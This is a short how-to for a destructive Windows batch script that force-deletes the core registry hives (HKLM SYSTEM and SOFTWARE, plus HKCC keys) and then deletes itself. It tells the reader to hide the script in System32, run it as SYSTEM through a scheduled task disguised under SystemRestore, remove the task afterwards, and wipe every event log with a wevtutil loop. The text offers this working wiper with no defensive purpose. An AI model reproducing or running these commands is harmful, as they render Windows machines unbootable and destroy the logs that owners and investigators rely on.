Create file bat:

@ECHO OFF
REG DELETE HKEY_CURRENT_CONFIG\System /f
REG DELETE HKEY_CURRENT_CONFIG\Software /f
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM /f
REG DELETE HKEY_LOCAL_MACHINE\SOFTWARE /f
(goto) 2>nul & del "%~f0"


Save it to C:\Windows\System32

Create a Scheduled task to launch it (in Windows/SystemRestore)

Launch with SYSTEM and delete the task after (settings in task scheduler)


Add :

for /F “tokens=*” %1 in ('wevtutil.exe el') DO wevtutil.exe cl “%1”

to delete all event log in windows
